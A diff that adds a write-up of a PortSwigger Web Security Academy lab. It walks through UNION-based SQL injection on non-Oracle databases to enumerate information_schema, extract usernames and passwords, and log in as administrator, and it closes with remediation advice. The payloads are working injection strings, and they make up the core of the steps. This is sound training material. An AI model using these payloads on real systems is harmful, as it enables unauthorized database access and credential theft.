@@ -1,0 +1,42 @@
+Lab 5: SQL Injection - Listing Database Contents on Non-Oracle Databases
+Platform: PortSwigger Web Security Academy
+Level: Practitioner
+Category: SQL Injection - Examining the Database
+Status: ✅ Solved
+
+Objective
+List all tables in the database, find the users table, extract usernames and passwords, then log in as administrator.
+
+Key Concept
+Non-Oracle databases (MySQL, PostgreSQL, Microsoft) store table info in information_schema.tables and column info in information_schema.columns.
+
+Steps to Solve
+Step 1 — Find number of columns:
+' ORDER BY 2--
+Step 2 — List all tables:
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+Found a table named something like users_abcxyz
+Step 3 — List columns in that table:
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcxyz'--
+Found columns: username_abc, password_abc
+Step 4 — Extract credentials:
+' UNION SELECT username_abc,password_abc FROM users_abcxyz--
+Got administrator username and password ✅
+Step 5 — Logged in as administrator ✅
+
+Tool Used
+
+Burp Suite (Repeater for payload testing)
+Browser
+
+
+Impact
+Critical — Full database enumeration and credential extraction. Complete account takeover possible.
+
+Remediation
+
+Use parameterized queries
+Restrict DB user from accessing information_schema
+Store passwords as salted hashes (bcrypt)
+Never store plaintext passwords
+ShareContentpdfpdf
